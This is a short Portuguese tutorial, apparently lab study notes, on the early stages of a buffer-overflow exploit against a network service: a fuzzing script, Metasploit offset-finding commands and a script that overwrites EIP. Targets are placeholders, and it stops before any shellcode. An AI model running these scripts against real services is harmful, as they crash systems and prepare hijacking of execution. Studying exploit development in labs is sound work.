# 🧪 Fuzzing, Offset & Controle EIP

---

## 1. Script de Fuzzing (Descobrindo o Crash)

```python
#!/usr/bin/python
import socket

lista = ["A"]
contador = 100

while len(lista) <= 50:
    lista.append("A" * contador)
    contador += 100

for dados in lista:
    print("Fuzzing com SEND %s bytes" % len(dados))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("IP_ALVO", PORTA))
    banner = s.recv(1024)
    s.send("SEND " + dados + "\r\n")
    s.close()
```

---

## 2. Encontrando o Offset Exato

Gerar padrão cíclico com ferramentas do Metasploit Framework:

```bash
# Gere um padrão de 2200 caracteres (ajuste conforme o tamanho do crash no fuzzing)
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2200

# Execute o programa no debugger com o padrão gerado e anote o valor hexadecimal do EIP
# Descubra o offset exato:
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2200 -q 42306142
# Saída esperada: Exact match at offset 780
```

### Script de Validação do Offset Cíclico:

```python
#!/usr/bin/python
import socket

# Payload gerado pelo pattern_create
payload = "Aa0Aa1Aa2Aa3..."

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("IP_ALVO", PORTA))
s.recv(1024)
s.send("SEND " + payload + "\r\n")
s.close()
# Verifique o valor do EIP no debugger (Immunity / GDB)
```

---

## 3. Confirmando o Controle do EIP

Para validar se o offset encontrado é exato, sobrescrevemos o EIP especificamente com 4 B's (`0x42424242`):

```python
#!/usr/bin/python
import socket

offset = 780  # Valor encontrado no pattern_offset
payload = "A" * offset + "BBBB" + "C" * (1000 - offset - 4)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("IP_ALVO", PORTA))
s.recv(1024)
s.send("SEND " + payload + "\r\n")
s.close()
# Certifique-se de que EIP = 0x42424242 (BBBB)
```